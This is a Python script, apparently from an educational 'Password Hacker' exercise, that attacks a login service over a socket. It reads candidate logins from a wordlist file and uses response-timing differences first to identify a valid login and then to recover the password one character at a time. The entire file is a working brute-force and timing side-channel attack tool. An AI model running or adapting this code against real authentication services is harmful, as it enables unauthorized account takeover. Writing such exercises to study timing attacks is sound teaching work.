import datetime
import itertools
import json
import socket
import string
import sys


def get_login(_path):
    with open(_path) as login_file:
        for login in login_file:
            yield login.replace('\n', '')


def check_delay(_client, _login):
    start = datetime.datetime.now()
    data = {'login': _login, 'password': ''}
    _client.send(json.dumps(data).encode())
    json.loads(_client.recv(1024).decode())
    finish = datetime.datetime.now()
    return finish - start


def brute_login(_client, _path):
    _client.connect(address)
    data = {}
    delay = check_delay(_client, '')
    for login in get_login(_path):
        data['login'] = login
        data['password'] = ''
        start = datetime.datetime.now()
        _client.send(json.dumps(data).encode())
        answer = json.loads(_client.recv(1024).decode())
        finish = datetime.datetime.now()
        current_delay = finish - start
        if current_delay > delay:
            return login


def brute_password(_client, _login):
    password = ''
    data = {'login': _login, 'password': password}
    delay = check_delay(_client, _login)
    while True:
        for current_password in selection_password(password):
            data['password'] = current_password
            start = datetime.datetime.now()
            _client.send(json.dumps(data).encode())
            answer = json.loads(_client.recv(2048).decode())
            finish = datetime.datetime.now()
            current_delay = finish - start
            if answer['result'] == 'Connection success!':
                return data
            if current_delay > delay:
                password = current_password
                break


def selection_password(_password):
    current_password = str(_password)
    for symbol in itertools.chain(string.ascii_letters, string.digits):
        yield current_password + symbol


def brute(_address, _path):
    with socket.socket() as client:
        login = brute_login(client, _path)
        return brute_password(client, login)


args = sys.argv
address = (args[1], int(args[2]))
answer = brute(address, '/home/noni/PycharmProjects/Password Hacker/Password Hacker/task/hacking/logins.txt')
print(json.dumps(answer))
